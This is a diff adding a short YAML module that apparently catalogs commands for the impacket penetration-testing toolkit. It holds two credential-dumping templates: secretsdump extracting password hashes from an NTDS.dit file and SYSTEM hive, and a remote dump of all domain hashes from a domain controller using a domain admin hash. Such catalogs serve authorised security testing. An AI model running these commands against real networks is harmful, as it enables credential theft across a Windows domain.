@@ -1,0 +1,22 @@
+---
+name: impacket
+description: A collection of Python classes for working with network protocols
+os: Linux
+ptf_module: modules/exploitation/impacket
+---
+commands:
+  - "Locally Extract User Account Hashes from NTDS.dit using SYSTEM Hive File":
+    - type: ["bash","standalone"]
+    - text: "secretsdump.py -ntds {FILE} -system {FILE} LOCAL"
+    - input: ["ntds.dit file","system hive backup file"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Remotely Dump User Account Hashes from Domain Controller using Domain Admin Hash":
+    - type: ["bash","standalone"]
+    - text: "impacket-secretsdump -hashes {STR} -just-dc {STR}/{STR}\\$@{IPV4}"
+    - input: ["domain admin hash (LM:NT)","domain","domain controller hostname","domain controller IPv4 address"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+...
